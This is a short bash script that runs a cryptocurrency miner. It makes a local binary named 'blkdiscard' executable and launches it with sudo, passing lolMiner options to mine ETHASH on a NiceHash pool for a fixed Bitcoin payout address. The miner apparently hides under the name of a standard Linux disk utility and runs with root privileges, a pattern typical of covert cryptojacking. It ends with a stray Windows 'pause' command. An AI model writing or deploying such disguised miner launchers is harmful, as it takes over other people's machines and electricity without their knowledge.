#!/bin/bash

cd "$(dirname "$0")"

chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353 --user 3BA43RbJwMKFnqb5i3Jm5p3N6PXsiwJhEr.btc4 --ethstratum ETHPROXY
pause
